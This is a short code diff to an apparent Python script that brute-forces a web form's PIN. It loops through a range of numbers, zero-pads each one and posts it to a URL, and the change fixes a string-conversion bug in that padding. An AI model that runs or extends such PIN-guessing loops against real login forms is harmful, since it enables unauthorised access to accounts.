@@ -13,7 +13,7 @@ sess.get(url, params=params)
 
 for pin in range(range_start, range_stop+1):
     payload = {"formgo": "1",
-               "pin": ("{0:0=" + chars + "d}").format(pin)
+               "pin": ("{0:0=" + str(chars) + "d}").format(pin)
     }
     resp = sess.post(url, data=payload)
 
